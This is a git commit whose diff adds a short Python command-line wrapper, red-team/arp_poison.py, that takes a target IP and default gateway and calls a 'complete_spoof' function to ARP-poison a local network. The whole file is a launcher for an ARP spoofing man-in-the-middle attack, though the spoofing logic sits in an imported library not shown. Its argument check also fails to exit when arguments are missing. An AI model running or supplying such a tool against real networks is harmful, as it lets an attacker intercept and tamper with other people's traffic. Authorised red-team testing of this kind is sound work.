72ba504a33f15a3849eb76958c0f1605355cd4ce
hubymeme22 <huby.new1112@gmail.com>
2026-06-02 15:56:02 +0800

    implement simple cli tool for arp poison

--- red-team/arp_poison.py
+++ red-team/arp_poison.py
@@ -1,1 +1,10 @@
 from networklib.arpspoof import complete_spoof
+import sys
+
+if __name__ == "__main__":
+    if len(sys.argv) < 3:
+        print("Usage: arp_poison.py <target_ip> <default_gateway>")
+
+    target_ip = sys.argv[1]
+    default_gateway = sys.argv[2]
+    complete_spoof(target_ip, default_gateway)
